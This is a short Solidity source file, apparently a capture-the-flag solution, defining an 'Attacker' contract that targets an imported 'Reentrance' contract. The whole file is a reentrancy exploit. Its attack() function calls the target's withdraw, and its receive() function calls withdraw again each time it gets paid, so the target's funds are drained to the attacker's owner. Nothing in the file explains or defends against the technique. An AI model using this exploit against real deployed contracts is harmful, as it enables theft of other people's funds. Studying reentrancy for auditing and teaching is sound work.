pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract Attacker {
    address payable public owner;

    constructor() public{
        owner = msg.sender;
    }

    modifier onlyOwner{
        require(msg.sender == owner);
        _;
    }

    function attack(address payable _instance, uint _amount) public {
        Reentrance(_instance).withdraw(_amount);
    }

    receive() external payable{
        Reentrance(msg.sender).withdraw(msg.value);
    }

    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }

}
